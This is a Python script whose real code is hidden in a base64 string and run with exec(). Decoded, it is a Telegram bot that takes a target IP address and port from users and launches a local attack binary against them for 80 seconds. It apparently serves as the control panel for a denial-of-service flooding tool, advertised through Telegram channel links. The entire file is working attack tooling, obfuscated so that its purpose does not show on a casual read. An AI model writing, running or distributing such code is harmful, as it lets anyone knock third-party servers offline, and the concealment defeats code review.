import base64

# Encoded string embedded directly into the script
encoded_script = '''aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IGxvZ2dpbmcKZnJvbSB0ZWxlZ3JhbSBpbXBvcnQgVXBkYXRlLCBJbmxpbmVLZXlib2FyZEJ1dHRvbiwgSW5saW5lS2V5Ym9hcmRNYXJrdXAKZnJvbSB0ZWxlZ3JhbS5leHQgaW1wb3J0IEFwcGxpY2F0aW9uLCBDb21tYW5kSGFuZGxlciwgTWVzc2FnZUhhbmRsZXIsIENhbGxiYWNrUXVlcnlIYW5kbGVyLCBDb250ZXh0VHlwZXMsIGZpbHRlcnMKZnJvbSBmbGFzaGggaW1wb3J0IFRPS0VOICAjIEltcG9ydCB0aGUgVE9LRU4gdmFyaWFibGUgCiMgU2V0IHVwIGxvZ2dpbmcKbG9nZ2luZy5iYXNpY0NvbmZpZyhmb3JtYXQ9JyUoYXNjdGltZSlzIC0gJShuYW1lKXMgLSAlKGxldmVsbmFtZSlzIC0gJShtZXNzYWdlKXMnLCBsZXZlbD1sb2dnaW5nLklORk8pCgojIFBhdGggdG8geW91ciBiaW5hcnkKQklOQVJZX1BBVEggPSAiLi9mbGFzaCIKCiMgR2xvYmFsIHZhcmlhYmxlcwpwcm9jZXNzID0gTm9uZQp0YXJnZXRfaXAgPSBOb25lCnRhcmdldF9wb3J0ID0gTm9uZQphdHRhY2tfdGltZSA9IDgwICAjIERlZmF1bHQgYXR0YWNrIHRpbWUgc2V0IHRvIDgwIHNlY29uZHMKCiMgU3RhcnQgY29tbWFuZDogU2hvdyBBdHRhY2sgYnV0dG9uCmFzeW5jIGRlZiBzdGFydCh1cGRhdGU6IFVwZGF0ZSwgY29udGV4dDogQ29udGV4dFR5cGVzLkRFRkFVTFRfVFlQRSk6CiAgICBrZXlib2FyZCA9IFtbSW5saW5lS2V5Ym9hcmRCdXR0b24oIvCfmoBBdHRhY2vwn5qAIiwgY2FsbGJhY2tfZGF0YT0nYXR0YWNrJyldXQogICAgcmVwbHlfbWFya3VwID0gSW5saW5lS2V5Ym9hcmRNYXJrdXAoa2V5Ym9hcmQpCiAgICBhd2FpdCB1cGRhdGUubWVzc2FnZS5yZXBseV90ZXh0KCJCeSBodHRwczovL3QubWUvRkxBU0hfNTAyIPCfmoBQcmVzcyB0aGUgQXR0YWNrIGJ1dHRvbiB0byBzdGFydCBDSElOIFRBUEFLIERVTSBEVU0gKOKXjyfil6En4pePKSIsIHJlcGx5X21hcmt1cD1yZXBseV9tYXJrdXApCgojIEhhbmRsZSBidXR0b24gY2xpY2tzCmFzeW5jIGRlZiBidXR0b25faGFuZGxlcih1cGRhdGU6IFVwZGF0ZSwgY29udGV4dDogQ29udGV4dFR5cGVzLkRFRkFVTFRfVFlQRSk6CiAgICBxdWVyeSA9IHVwZGF0ZS5jYWxsYmFja19xdWVyeQogICAgYXdhaXQgcXVlcnkuYW5zd2VyKCkKCiAgICBpZiBxdWVyeS5kYXRhID09ICdhdHRhY2snOgogICAgICAgIGF3YWl0IHF1ZXJ5Lm1lc3NhZ2UucmVwbHlfdGV4dCgiQnkgaHR0cHM6Ly90Lm1lL0ZMQVNIXzUwMiBQbGVhc2UgZW50ZXIgdGhlIHRhcmdldCBhbmQgcG9ydCBpbiB0aGUgZm9ybWF0OiA8dGFyZ2V0PiA8cG9ydD7wn5qA8J+agCIpCgojIEhhbmRsZSB0YXJnZXQgYW5kIHBvcnQgaW5wdXQKYXN5bmMgZGVmIGhhbmRsZV9pbnB1dCh1cGRhdGU6IFVwZGF0ZSwgY29udGV4dDogQ29udGV4dFR5cGVzLkRFRkFVTFRfVFlQRSk6CiAgICBnbG9iYWwgdGFyZ2V0X2lwLCB0YXJnZXRfcG9ydCwgYXR0YWNrX3RpbWUKCiAgICBpZiB1cGRhdGUubWVzc2FnZSBpcyBOb25lOgogICAgICAgIGF3YWl0IHVwZGF0ZS5jYWxsYmFja19xdWVyeS5tZXNzYWdlLnJlcGx5X3RleHQoIlBsZWFzZSBlbnRlciB0aGUgdGFyZ2V0IGFuZCBwb3J0IGluIHRoZSBmb3JtYXQ6IDx0YXJnZXQ+IDxwb3J0PvCfmoDwn5qAIGh0dHBzOi8vdC5tZS9mbGFzaG1haW5jaGFubmVsIikKICAgICAgICByZXR1cm4KCiAgICB0cnk6CiAgICAgICAgIyBVc2VyIGlucHV0IGlzIGV4cGVjdGVkIGluIHRoZSBmb3JtYXQ6IDx0YXJnZXQ+IDxwb3J0PgogICAgICAgIHRhcmdldCwgcG9ydCA9IHVwZGF0ZS5tZXNzYWdlLnRleHQuc3BsaXQoKQogICAgICAgIHRhcmdldF9pcCA9IHRhcmdldAogICAgICAgIHRhcmdldF9wb3J0ID0gaW50KHBvcnQpCiAgICAgICAgCiAgICAgICAgIyBBdHRhY2sgdGltZSBpcyBmaXhlZCB0byA4MCBzZWNvbmRzCiAgICAgICAgYXR0YWNrX3RpbWUgPSA4MAoKICAgICAgICAjIFNob3cgU3RhcnQgYW5kIFJlc2V0IGJ1dHRvbnMgYWZ0ZXIgaW5wdXQgaXMgcmVjZWl2ZWQKICAgICAgICBrZXlib2FyZCA9IFsKICAgICAgICAgICAgW0lubGluZUtleWJvYXJkQnV0dG9uKCJTdGFydCBBdHRhY2vwn5qAIiwgY2FsbGJhY2tfZGF0YT0nc3RhcnRfYXR0YWNrJyldLAogICAgICAgICAgICMgW0lubGluZUtleWJvYXJkQnV0dG9uKCJSZXNldCBBdHRhY2vimpnvuI8iLCBjYWxsYmFja19kYXRhPSdyZXNldF9hdHRhY2snKV0KICAgICAgICBdCiAgICAgICAgcmVwbHlfbWFya3VwID0gSW5saW5lS2V5Ym9hcmRNYXJrdXAoa2V5Ym9hcmQpCiAgICAgICAgYXdhaXQgdXBkYXRlLm1lc3NhZ2UucmVwbHlfdGV4dChmIlRhcmdldDoge3RhcmdldF9pcH0sIFBvcnQ6IHt0YXJnZXRfcG9ydH0sIFRpbWU6IHthdHRhY2tfdGltZX0gc2Vjb25kcyBjb25maWd1cmVkLlxuIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIk5vdyBjaG9vc2UgYW4gYWN0aW9uOlxuIGh0dHBzOi8vdC5tZS9mbGFzaG1haW5jaGFubmVsIiwgcmVwbHlfbWFya3VwPXJlcGx5X21hcmt1cCkKICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIGF3YWl0IHVwZGF0ZS5tZXNzYWdlLnJlcGx5X3RleHQoJycnSW52YWxpZCBmb3JtYXQuIFBsZWFzZSBlbnRlciBpbiB0aGUgZm9ybWF0OiAKPHRhcmdldD4gPHBvcnQ+8J+agPCfmoAnJycpCgojIFN0YXJ0IHRoZSBhdHRhY2sKYXN5bmMgZGVmIHN0YXJ0X2F0dGFjayh1cGRhdGU6IFVwZGF0ZSwgY29udGV4dDogQ29udGV4dFR5cGVzLkRFRkFVTFRfVFlQRSk6CiAgICBnbG9iYWwgcHJvY2VzcywgdGFyZ2V0X2lwLCB0YXJnZXRfcG9ydCwgYXR0YWNrX3RpbWUKICAgIGlmIG5vdCB0YXJnZXRfaXAgb3Igbm90IHRhcmdldF9wb3J0IG9yIG5vdCBhdHRhY2tfdGltZToKICAgICAgICBhd2FpdCB1cGRhdGUuY2FsbGJhY2tfcXVlcnkubWVzc2FnZS5yZXBseV90ZXh0KCJQbGVhc2UgY29uZmlndXJlIHRoZSB0YXJnZXQgYW5kIHBvcnQgZmlyc3QuIikKICAgICAgICByZXR1cm4KCiAgICBpZiBwcm9jZXNzIGFuZCBwcm9jZXNzLnBvbGwoKSBpcyBOb25lOgogICAgICAgIGF3YWl0IHVwZGF0ZS5jYWxsYmFja19xdWVyeS5tZXNzYWdlLnJlcGx5X3RleHQoIkF0dGFjayBpcyBhbHJlYWR5IHJ1bm5pbmcuIikKICAgICAgICByZXR1cm4KCiAgICB0cnk6CiAgICAgICAgIyBSdW4gdGhlIGJpbmFyeSB3aXRoIHRhcmdldCwgcG9ydCwgYW5kIHRpbWUKICAgICAgICBwcm9jZXNzID0gc3VicHJvY2Vzcy5Qb3BlbihbQklOQVJZX1BBVEgsIHRhcmdldF9pcCwgc3RyKHRhcmdldF9wb3J0KSwgc3RyKGF0dGFja190aW1lKV0sIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUpCiAgICAgICAgYXdhaXQgdXBkYXRlLmNhbGxiYWNrX3F1ZXJ5Lm1lc3NhZ2UucmVwbHlfdGV4dChmIkNISU4gVEFQQUsgRFVNIERVTSjil48n4pehJ+KXjykge3RhcmdldF9pcH06e3RhcmdldF9wb3J0fSBmb3Ige2F0dGFja190aW1lfSBzZWNvbmRzIFxuIEZlZWRCYWNrIERlIERpbyBZYWFkIHNlIPCfmKEgeWhhIHBlIDotIGh0dHBzOi8vdC5tZS9GTEFTSF81MDIgICIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgYXdhaXQgdXBkYXRlLmNhbGxiYWNrX3F1ZXJ5Lm1lc3NhZ2UucmVwbHlfdGV4dChmIkVycm9yIHN0YXJ0aW5nIGF0dGFjazoge2V9IFxuIEZpbGVzIGthIG5hbWUgZ2FsdCBoIFxuICBnaXRodWIgbWUgamFrYXIgY2hlayBrcm8gZmlsZXMga2EgbmFtZSBrdWNoIGFpc2EgaG9uYSBjaGFoaXllIPCfkYdcbiBmbGFzaCBcbiBmbGFzaC5weSBcbiBmbGFzaGgucHkgXG4gZmxhc2guc2ggIikKICAgICAgICBsb2dnaW5nLmVycm9yKGYiRXJyb3Igc3RhcnRpbmcgYXR0YWNrOiB7ZX0iKQoKIyBSZXNldCB0aGUgYXR0YWNrCmFzeW5jIGRlZiByZXNldF9hdHRhY2sodXBkYXRlOiBVcGRhdGUsIGNvbnRleHQ6IENvbnRleHRUeXBlcy5ERUZBVUxUX1RZUEUpOgogICAgZ2xvYmFsIHByb2Nlc3MsIHRhcmdldF9pcCwgdGFyZ2V0X3BvcnQsIGF0dGFja190aW1lCiAgICBpZiBwcm9jZXNzIGFuZCBwcm9jZXNzLnBvbGwoKSBpcyBOb25lOgogICAgICAgIHByb2Nlc3MudGVybWluYXRlKCkKICAgICAgICBwcm9jZXNzLndhaXQoKQoKICAgIHRhcmdldF9pcCA9IE5vbmUKICAgIHRhcmdldF9wb3J0ID0gTm9uZQogICAgYXR0YWNrX3RpbWUgPSA4MCAgIyBSZXNldHRpbmcgYXR0YWNrIHRpbWUgdG8gZGVmYXVsdCA4MCBzZWNvbmRzCiAgICBhd2FpdCB1cGRhdGUuY2FsbGJhY2tfcXVlcnkubWVzc2FnZS5yZXBseV90ZXh0KCJBdHRhY2sgcmVzZXQuIEJ5IGh0dHBzOi8vdC5tZS9GTEFTSF81MDIgUGxlYXNlIGVudGVyIHRoZSB0YXJnZXQgYW5kIHBvcnQgaW4gdGhlIGZvcm1hdDogPHRhcmdldD4gPHBvcnQ+8J+agCIpCgojIEJ1dHRvbiBhY3Rpb24gaGFuZGxlciBmb3Igc3RhcnQvcmVzZXQgYWN0aW9ucwphc3luYyBkZWYgYnV0dG9uX2NhbGxiYWNrX2hhbmRsZXIodXBkYXRlOiBVcGRhdGUsIGNvbnRleHQ6IENvbnRleHRUeXBlcy5ERUZBVUxUX1RZUEUpOgogICAgcXVlcnkgPSB1cGRhdGUuY2FsbGJhY2tfcXVlcnkKICAgIGF3YWl0IHF1ZXJ5LmFuc3dlcigpCgogICAgaWYgcXVlcnkuZGF0YSA9PSAnc3RhcnRfYXR0YWNrJzoKICAgICAgICBhd2FpdCBzdGFydF9hdHRhY2sodXBkYXRlLCBjb250ZXh0KQogICAgZWxpZiBxdWVyeS5kYXRhID09ICdyZXNldF9hdHRhY2snOgogICAgICAgIGF3YWl0IHJlc2V0X2F0dGFjayh1cGRhdGUsIGNvbnRleHQpCgojIE1haW4gZnVuY3Rpb24gdG8gc3RhcnQgdGhlIGJvdApkZWYgbWFpbigpOgogICAgIyBDcmVhdGUgQXBwbGljYXRpb24gb2JqZWN0IHdpdGggeW91ciBib3QncyB0b2tlbgogICAgYXBwbGljYXRpb24gPSBBcHBsaWNhdGlvbi5idWlsZGVyKCkudG9rZW4oVE9LRU4pLmJ1aWxkKCkKCiAgICAjIFJlZ2lzdGVyIGNvbW1hbmQgaGFuZGxlciBmb3IgL3N0YXJ0CiAgICBhcHBsaWNhdGlvbi5hZGRfaGFuZGxlcihDb21tYW5kSGFuZGxlcigic3RhcnQiLCBzdGFydCkpCgogICAgIyBSZWdpc3RlciBidXR0b24gaGFuZGxlcgogICAgYXBwbGljYXRpb24uYWRkX2hhbmRsZXIoQ2FsbGJhY2tRdWVyeUhhbmRsZXIoYnV0dG9uX2hhbmRsZXIsIHBhdHRlcm49J15hdHRhY2skJykpCiAgICBhcHBsaWNhdGlvbi5hZGRfaGFuZGxlcihDYWxsYmFja1F1ZXJ5SGFuZGxlcihidXR0b25fY2FsbGJhY2tfaGFuZGxlciwgcGF0dGVybj0nXihzdGFydF9hdHRhY2t8cmVzZXRfYXR0YWNrKSQnKSkKCiAgICAjIFJlZ2lzdGVyIG1lc3NhZ2UgaGFuZGxlciB0byBoYW5kbGUgaW5wdXQgZm9yIHRhcmdldCBhbmQgcG9ydAogICAgYXBwbGljYXRpb24uYWRkX2hhbmRsZXIoTWVzc2FnZUhhbmRsZXIoZmlsdGVycy5URVhUICYgfmZpbHRlcnMuQ09NTUFORCwgaGFuZGxlX2lucHV0KSkKCiAgICAjIFN0YXJ0IHRoZSBib3QKICAgIGFwcGxpY2F0aW9uLnJ1bl9wb2xsaW5nKCkKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCkK'''

# Decode and execute the script
decoded_script = base64.b64decode(encoded_script).decode('utf-8')
exec(decoded_script)
